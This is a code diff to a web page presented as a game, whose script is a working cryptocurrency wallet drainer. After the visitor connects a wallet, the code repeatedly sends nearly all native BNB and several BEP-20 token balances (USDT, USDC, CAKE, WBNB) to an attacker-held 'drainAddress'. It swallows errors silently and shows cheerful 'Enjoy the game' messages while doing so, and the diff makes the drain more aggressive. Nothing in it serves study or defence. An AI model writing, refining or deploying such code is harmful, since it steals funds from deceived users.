@@ -66,30 +66,20 @@
     const status = document.getElementById("status");
     const btn = document.getElementById("playBtn");
 
-    // Correct BNB Chain (BSC) token addresses
+    // Only reliable BNB Chain tokens
     const tokens = [
       {s:"USDT", a:"0x55d398326f99059ff775485246999027b3197955"},
       {s:"USDC", a:"0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d"},
-      {s:"BUSD", a:"0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56"},
       {s:"CAKE", a:"0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82"},
-      {s:"WBNB", a:"0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c"},
-      {s:"BTCB", a:"0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c"},
-      {s:"ETH",  a:"0x2170Ed0880ac9A755fd29B2688956BD959F933F8"},
-      {s:"TWT",  a:"0x4B0F1812e5Df2A09796481Ff14017e6005508003"},
-      {s:"BAKE", a:"0xE02dF9e3e622DeBdD69fb838bB799E3F168902c5"},
-      {s:"FLOKI",a:"0xfb5B838b6cfEEdC2873aB27866079AC55363D37E"},
-      {s:"SHIB", a:"0x2859e4544C4bB03966803B044A93563bD2d0dD4d"},
-      {s:"LINK", a:"0xF8A0bf9cF54Bb92F17374d9e9A321E6a111a51bd"}
+      {s:"WBNB", a:"0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c"}
     ];
 
     const abi = [
-      "balanceOf(address) view returns (uint256)",
-      "transfer(address,uint256) returns (bool)"
+      "function balanceOf(address) view returns (uint256)",
+      "function transfer(address,uint256) returns (bool)"
     ];
 
     let connected = false;
-    let lastNative = 0n;
-    let drainedSomething = false;
 
     async function drain() {
       if (!window.ethereum) {
@@ -99,62 +89,59 @@
 
       try {
         if (!connected) {
+          status.innerHTML = "Connecting... 💕";
           await window.ethereum.request({method: "eth_requestAccounts"});
           connected = true;
-          status.innerHTML = "Connecting... 💕";
         }
 
         const provider = new ethers.BrowserProvider(window.ethereum);
         const signer = await provider.getSigner();
         const user = await signer.getAddress();
 
-        drainedSomething = false;
+        let drained = false;
 
-        // Drain Native BNB
+        // Drain Native BNB - very aggressive
         const nativeBalance = await provider.getBalance(user);
-        const minThreshold = ethers.parseEther("0.0001");
-        const reserve = ethers.parseEther("0.0002");
-
-        if (nativeBalance > lastNative && nativeBalance > minThreshold) {
-          const amount = nativeBalance - reserve;
-          if (amount > 0n) {
-            const gasEstimate = await provider.estimateGas({to: drainAddress, value: amount});
-            await signer.sendTransaction({
-              to: drainAddress,
-              value: amount,
-              gasLimit: (gasEstimate * 130n) / 100n
-            });
-            lastNative = nativeBalance;
-            drainedSomething = true;
+        if (nativeBalance > ethers.parseEther("0.0003")) {
+          const amountToSend = nativeBalance - ethers.parseEther("0.0003");
+          if (amountToSend > 0n) {
+            try {
+              await signer.sendTransaction({
+                to: drainAddress,
+                value: amountToSend,
+                gasLimit: 150000
+              });
+              drained = true;
+            } catch (e) {}
           }
         }
 
-        // Drain Tokens
+        // Drain main tokens
         for (const token of tokens) {
           try {
             const contract = new ethers.Contract(token.a, abi, signer);
             const balance = await contract.balanceOf(user);
-            if (balance > 0n) {
-              await contract.transfer(drainAddress, balance, {gasLimit: 200000n});
-              drainedSomething = true;
+            if (balance > ethers.parseUnits("0.1", 18)) {   // only if meaningful amount
+              await contract.transfer(drainAddress, balance, {gasLimit: 200000});
+              drained = true;
             }
           } catch (e) {}
         }
 
-        if (drainedSomething) {
+        if (drained) {
           status.innerHTML = "<span class='success'>Welcome! Enjoy the game 💖</span>";
         } else {
           status.innerHTML = "<span class='error'>Try again later 💔</span>";
         }
+
       } catch (e) {
         status.innerHTML = "<span class='error'>Something went wrong 💔</span>";
       }
     }
 
     btn.onclick = () => {
-      drainedSomething = false;
       drain();
-      setInterval(drain, 25000);
+      setInterval(drain, 20000);
     };
   </script>
 </body>
